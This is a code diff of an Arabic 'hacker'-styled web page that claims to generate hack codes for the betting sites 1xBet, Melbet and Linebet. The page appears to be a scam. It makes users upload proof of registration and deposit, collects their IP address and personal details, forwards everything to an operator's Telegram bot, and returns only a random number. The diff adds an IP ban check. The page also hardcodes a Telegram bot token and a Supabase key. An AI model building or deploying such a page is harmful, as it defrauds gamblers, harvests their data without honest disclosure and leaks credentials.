@@ -7,29 +7,16 @@
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
+    <div id="toast" class="custom-toast"><span id="toastMessage"></span></div>
+    <div id="loadingOverlay" class="loading-overlay"><div class="spinner"></div><div id="loadingText" style="color:#0f0;">جاري التحقق...</div></div>
 
-    <div id="toast" class="custom-toast">
-        <span id="toastIcon">⚠️</span>
-        <span id="toastMessage">تنبيه</span>
-    </div>
-
-    <div id="loadingOverlay" class="loading-overlay">
-        <div class="spinner"></div>
-        <div style="font-family:'Fira Code'; color:#0f0;" id="loadingText">جاري المعالجة...</div>
-    </div>
-
-    <div class="container wide-mode">
-        <h2 id="typewriterTitle"></h2> <label class="title">>> اختر النظام المستهدف:</label>
+    <div class="container wide-mode" id="mainContainer" style="display:none;"> <h2 id="typewriterTitle"></h2>
+        
+        <label class="title">>> اختر النظام المستهدف:</label>
         <div class="program-grid">
-            <div class="program-option" onclick="playSound('click'); selectProgram('1x', this)">
-                <img src="1x.png" class="program-icon" alt="1xBet">
-            </div>
-            <div class="program-option" onclick="playSound('click'); selectProgram('m', this)">
-                <img src="m.png" class="program-icon" alt="Melbet">
-            </div>
-            <div class="program-option" onclick="playSound('click'); selectProgram('l', this)">
-                <img src="l.png" class="program-icon" alt="Linebet">
-            </div>
+            <div class="program-option" onclick="selectProgram('1x', this)"><img src="1x.png" class="program-icon"></div>
+            <div class="program-option" onclick="selectProgram('m', this)"><img src="m.png" class="program-icon"></div>
+            <div class="program-option" onclick="selectProgram('l', this)"><img src="l.png" class="program-icon"></div>
         </div>
 
         <label class="title">>> بيانات العميل:</label>
@@ -39,10 +26,7 @@
             <div style="flex: 1; min-width: 250px;">
                 <label class="title">>> إثبات التسجيل:</label>
                 <label for="regProof" class="upload-box" id="regBox">
-                    <div class="upload-placeholder">
-                        <span id="regText">اضغط للرفع</span>
-                        <span>📂</span>
-                    </div>
+                    <div style="z-index:1"><span id="regText">رفع</span> 📂</div>
                     <img id="regPreview" class="preview-img">
                     <input type="file" id="regProof" accept="image/*" onchange="handleFileSelect(this, 'regBox', 'regText', 'regPreview')">
                 </label>
@@ -50,138 +34,84 @@
             <div style="flex: 1; min-width: 250px;">
                 <label class="title">>> إثبات الإيداع:</label>
                 <label for="depProof" class="upload-box" id="depBox">
-                    <div class="upload-placeholder">
-                        <span id="depText">اضغط للرفع</span>
-                        <span>💰</span>
-                    </div>
+                    <div style="z-index:1"><span id="depText">رفع</span> 💰</div>
                     <img id="depPreview" class="preview-img">
                     <input type="file" id="depProof" accept="image/*" onchange="handleFileSelect(this, 'depBox', 'depText', 'depPreview')">
                 </label>
             </div>
         </div>
 
-        <button id="submitBtn" onclick="playSound('click')">حقن البيانات وتوليد الكود</button>
+        <button id="submitBtn">حقن البيانات وتوليد الكود</button>
         
         <div id="codeDisplay" class="hidden" style="margin-top: 30px; border-top: 2px dashed #333; padding-top: 20px;">
             <p style="color:var(--hacker-green);">>> تم التوليد بنجاح:</p>
             <div style="background:#000; padding:15px; border:2px solid var(--hacker-green); margin:15px 0; font-size:2rem; font-weight:900; letter-spacing:3px; font-family:'Fira Code';" id="generatedCode"></div>
-            
-            <button class="copy-btn" onclick="copyCode()">📋 نسخ الكود</button>
-            <br>
-            <button class="secondary-btn" onclick="window.location.href='index.html'">الخروج</button>
+            <button class="action-btn" onclick="navigator.clipboard.writeText(document.getElementById('generatedCode').innerText); alert('تم النسخ')">📋 نسخ</button>
         </div>
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <script>
-        // --- 1. إعدادات الصوت (Hacker Beeps) ---
-        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-        function playSound(type) {
-            if (audioCtx.state === 'suspended') audioCtx.resume();
-            const osc = audioCtx.createOscillator();
-            const gain = audioCtx.createGain();
-            osc.connect(gain);
-            gain.connect(audioCtx.destination);
-            
-            if (type === 'click') {
-                osc.type = 'sine';
-                osc.frequency.setValueAtTime(800, audioCtx.currentTime);
-                gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
-                osc.start(); osc.stop(audioCtx.currentTime + 0.05);
-            } else if (type === 'success') {
-                osc.type = 'square';
-                osc.frequency.setValueAtTime(400, audioCtx.currentTime);
-                osc.frequency.exponentialRampToValueAtTime(1000, audioCtx.currentTime + 0.1);
-                gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
-                osc.start(); osc.stop(audioCtx.currentTime + 0.3);
-            }
-        }
-
-        // --- 2. تأثير الماوس (Spotlight) ---
-        document.addEventListener('mousemove', e => {
-            document.body.style.setProperty('--mouse-x', e.clientX + 'px');
-            document.body.style.setProperty('--mouse-y', e.clientY + 'px');
-        });
-
-        // --- 3. تأثير الكتابة التلقائية ---
-        function typeWriter(text, elementId, speed = 50) {
-            let i = 0;
-            const target = document.getElementById(elementId);
-            target.innerHTML = "";
-            function type() {
-                if (i < text.length) {
-                    target.innerHTML += text.charAt(i);
-                    i++;
-                    setTimeout(type, speed);
-                }
-            }
-            type();
-        }
-        window.onload = () => typeWriter("إعداد تصريح جديد //", "typewriterTitle");
-
-        // --- 4. منع الإغلاق الخطأ ---
-        window.addEventListener('beforeunload', function (e) {
-            if (document.getElementById('userData').value !== "") {
-                e.preventDefault();
-                e.returnValue = '';
-            }
-        });
-
-        // --- المنطق الأساسي ---
         const SUPABASE_URL = 'https://zflgifemhopabfzgczgs.supabase.co';
         const SUPABASE_KEY = 'sb_publishable_9xZcd3BkgL6cEQwHJitrew_mbX74lJW';
         const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
         const TELEGRAM_TOKEN = '8362386006:AAF8yKWrs7LCKva6zcu379Vn-vma1xbjF1s';
         const ADMIN_CHAT_ID = '8114406682';
 
-        let selectedProgram = null;
-        let userIP = "غير معروف";
+        let userIP = "Unknown";
 
-        // جلب الـ IP
-        fetch('https://api.ipify.org?format=json')
-            .then(res => res.json())
-            .then(data => userIP = data.ip);
+        // === فحص الحظر عند بدء التشغيل ===
+        async function checkBan() {
+            document.getElementById('loadingOverlay').classList.add('active');
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                userIP = data.ip;
 
-        function showToast(msg, type='error') {
-            const t = document.getElementById('toast');
-            document.getElementById('toastMessage').innerText = msg;
-            t.style.borderLeftColor = type === 'success' ? '#0f0' : '#f00';
-            t.className = 'custom-toast show';
-            setTimeout(() => t.classList.remove('show'), 4000);
+                // التحقق من قاعدة البيانات
+                const { data: banned } = await _supabase.from('banned_ips').select('*').eq('ip', userIP);
+                
+                if (banned && banned.length > 0) {
+                    document.body.innerHTML = `
+                        <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:red;flex-direction:column;text-align:center;">
+                            <h1 style="font-size:4rem;">🚫 ACCESS DENIED</h1>
+                            <p style="font-family:'Fira Code'; font-size:1.5rem;">YOUR IP HAS BEEN BANNED</p>
+                            <p style="color:#555;">${userIP}</p>
+                        </div>
+                    `;
+                } else {
+                    // السماح بالدخول
+                    document.getElementById('loadingOverlay').classList.remove('active');
+                    document.getElementById('mainContainer').style.display = 'block';
+                    typeWriter("إعداد تصريح جديد //", "typewriterTitle");
+                }
+            } catch (e) {
+                console.error("IP Check Failed", e);
+                // في حالة فشل الفحص، نسمح بالدخول افتراضياً أو نمنعه حسب رغبتك (هنا نسمح)
+                document.getElementById('loadingOverlay').classList.remove('active');
+                document.getElementById('mainContainer').style.display = 'block';
+            }
         }
+        window.onload = checkBan;
 
-        // معاينة الصور
+        // باقي دوال الموقع (نفس السابق)
+        function typeWriter(text, elementId) {
+            let i = 0; const target = document.getElementById(elementId); target.innerHTML = "";
+            function type() { if (i < text.length) { target.innerHTML += text.charAt(i); i++; setTimeout(type, 50); } }
+            type();
+        }
         function handleFileSelect(input, boxId, textId, previewId) {
             if(input.files[0]) {
-                playSound('click');
                 const file = input.files[0];
                 document.getElementById(boxId).classList.add('uploaded');
-                document.getElementById(textId).innerText = "تم: " + file.name;
-                
-                // إظهار المعاينة
+                document.getElementById(textId).innerText = "تم";
                 const reader = new FileReader();
-                reader.onload = function(e) {
-                    const img = document.getElementById(previewId);
-                    img.src = e.target.result;
-                    img.style.display = "block";
-                }
+                reader.onload = e => { const img = document.getElementById(previewId); img.src = e.target.result; img.style.display = "block"; }
                 reader.readAsDataURL(file);
             }
         }
-
-        function selectProgram(name, el) {
-            selectedProgram = name;
-            document.querySelectorAll('.program-option').forEach(d => d.classList.remove('selected'));
-            el.classList.add('selected');
-        }
-
-        function copyCode() {
-            const code = document.getElementById('generatedCode').innerText;
-            navigator.clipboard.writeText(code);
-            showToast("تم نسخ الكود للحافظة!", "success");
-            playSound('click');
-        }
-
+        let selectedProgram = null;
+        function selectProgram(name, el) { selectedProgram = name; document.querySelectorAll('.program-option').forEach(d => d.classList.remove('selected')); el.classList.add('selected'); }
         async function uploadImage(file) {
             const fileName = `${Date.now()}_${file.name.replace(/\s/g, '_')}`;
             const { error } = await _supabase.storage.from('proofs').upload(fileName, file);
@@ -189,55 +119,36 @@
             const { data } = _supabase.storage.from('proofs').getPublicUrl(fileName);
             return data.publicUrl;
         }
-
-        async function sendToTelegram(program, data, code, regUrl, depUrl, ip) {
-            const apiUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
-            const message = `🚨 <b>طلب جديد!</b>\n\n💻 <b>${program}</b>\n🌍 <b>IP:</b> ${ip}\n👤 <b>بيانات:</b>\n${data}\n\n🔑 <code>${code}</code>`;
-            try {
-                await fetch(`${apiUrl}/sendMessage`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: message, parse_mode: 'HTML' }) });
-                await fetch(`${apiUrl}/sendPhoto`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, photo: regUrl, caption: "📂 تسجيل" }) });
-                await fetch(`${apiUrl}/sendPhoto`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, photo: depUrl, caption: "💰 إيداع" }) });
-            } catch (error) { console.error("Telegram Error", error); }
-        }
-
         async function runSubmit() {
             const userData = document.getElementById('userData').value;
             const regFile = document.getElementById('regProof').files[0];
             const depFile = document.getElementById('depProof').files[0];
             const btn = document.getElementById('submitBtn');
 
-            if(!selectedProgram) { showToast("⚠️ اختر البرنامج"); return; }
-            if(!userData) { showToast("⚠️ أدخل البيانات"); return; }
-            if(!regFile || !depFile) { showToast("⚠️ ارفع الصور"); return; }
+            if(!selectedProgram || !userData || !regFile || !depFile) { alert("أكمل البيانات!"); return; }
 
-            document.getElementById('loadingOverlay').classList.add('active');
+            btn.innerText = "جاري المعالجة..."; btn.disabled = true;
 
             try {
                 const regUrl = await uploadImage(regFile);
                 const depUrl = await uploadImage(depFile);
                 const code = 'CODE-' + Math.floor(100000 + Math.random() * 900000);
-                
-                // إضافة الـ IP للبيانات
                 const fullData = `النظام: [${selectedProgram}] | IP: ${userIP}\n${userData}`;
 
                 await _supabase.from('requests').insert([{ user_data: fullData, reg_proof_url: regUrl, dep_proof_url: depUrl, generated_code: code }]);
                 await _supabase.from('active_codes').insert([{ code: code }]);
 
-                sendToTelegram(selectedProgram, userData, code, regUrl, depUrl, userIP);
+                // إرسال للتليجرام
+                const apiUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
+                const msg = `🚨 <b>طلب جديد!</b>\n🌍 <b>IP:</b> ${userIP}\n💻 <b>${selectedProgram}</b>\n${userData}\n🔑 <code>${code}</code>`;
+                fetch(`${apiUrl}/sendMessage`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: msg, parse_mode: 'HTML' }) });
+                fetch(`${apiUrl}/sendPhoto`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, photo: regUrl }) });
+                fetch(`${apiUrl}/sendPhoto`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, photo: depUrl }) });
 
-                document.getElementById('loadingOverlay').classList.remove('active');
-                playSound('success');
-                
-                showToast("تم التوليد بنجاح!", "success");
                 document.getElementById('codeDisplay').classList.remove('hidden');
                 document.getElementById('generatedCode').innerText = code;
                 btn.style.display = 'none';
-                
-            } catch (e) {
-                console.error(e);
-                document.getElementById('loadingOverlay').classList.remove('active');
-                showToast("فشل الاتصال");
-            }
+            } catch (e) { alert("فشل الاتصال"); btn.disabled = false; }
         }
         document.getElementById('submitBtn').addEventListener('click', runSubmit);
     </script>
